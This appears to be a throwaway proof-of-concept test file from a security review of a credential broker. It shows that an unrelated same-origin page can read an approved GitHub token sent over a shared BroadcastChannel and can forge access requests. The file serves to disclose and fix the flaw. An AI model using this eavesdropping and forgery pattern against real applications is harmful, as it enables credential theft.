/**
 * Adversarial review proof — the 4allpass-access-v1 BroadcastChannel reply is a
 * broadcast, so every same-origin context (any tab on http://127.0.0.1:8788)
 * receives the approved access_token, whether or not it made the request.
 *
 * Node's BroadcastChannel has the same delivery semantics as the DOM one.
 * Throwaway: demonstrates the finding, not part of the product test suite.
 */
import assert from "node:assert/strict";
import { test } from "node:test";
import { BroadcastChannel } from "node:worker_threads";

const ACCESS_CHANNEL = "4allpass-access-v1";
const LIVE_PAT = "ghp_thisIsTheLongLivedPersonalAccessToken";

test("F-11 an unrelated same-origin listener reads the granted secret", async () => {
  // 1. The unlocked 4AllPass page (AccessBrokerHost.sendReply / finish).
  const unlockedPage = new BroadcastChannel(ACCESS_CHANNEL);

  // 2. The honest requester (agent-request.html).
  const honest = new BroadcastChannel(ACCESS_CHANNEL);

  // 3. A page the user was tricked into opening on the same origin. It never
  //    posted anything and holds no pairing token.
  const eavesdropper = new BroadcastChannel(ACCESS_CHANNEL);
  const stolen = new Promise((resolve) => {
    eavesdropper.onmessage = (event) => {
      if (event.data?.body?.status === "approved") resolve(event.data.body.access_token);
    };
  });

  unlockedPage.onmessage = (event) => {
    const msg = event.data;
    if (msg?.method !== "POST /v1/access/request") return;
    // The exact shape AccessBrokerHost posts back after a human clicks Allow.
    unlockedPage.postMessage({
      v: 1,
      id: msg.id,
      body: { status: "approved", access_token: LIVE_PAT, expires_in: 600 },
    });
  };

  honest.postMessage({
    v: 1,
    id: "req_honest",
    method: "POST /v1/access/request",
    body: {
      application: "n8n",
      provider: "GitHub",
      credential: "personal",
      scope: ["repository.read"],
      ttl: 600,
    },
  });

  assert.equal(await stolen, LIVE_PAT);

  for (const ch of [unlockedPage, honest, eavesdropper]) ch.close();
});

test("F-11b any same-origin page can also originate a request with application: n8n", async () => {
  const unlockedPage = new BroadcastChannel(ACCESS_CHANNEL);
  const attacker = new BroadcastChannel(ACCESS_CHANNEL);

  const sawPrompt = new Promise((resolve) => {
    unlockedPage.onmessage = (event) => {
      if (event.data?.method === "POST /v1/access/request") resolve(event.data.body);
    };
  });

  // No Authorization header exists on this transport. No pairing token. No
  // Origin check. The grant-path 403 in broker.py is simply not on this path.
  attacker.postMessage({
    v: 1,
    id: "req_attacker",
    method: "POST /v1/access/request",
    body: {
      application: "n8n",
      provider: "GitHub",
      credential: "personal",
      scope: ["repository.read"],
      ttl: 600,
    },
  });

  assert.deepEqual(await sawPrompt, {
    application: "n8n",
    provider: "GitHub",
    credential: "personal",
    scope: ["repository.read"],
    ttl: 600,
  });

  for (const ch of [unlockedPage, attacker]) ch.close();
});
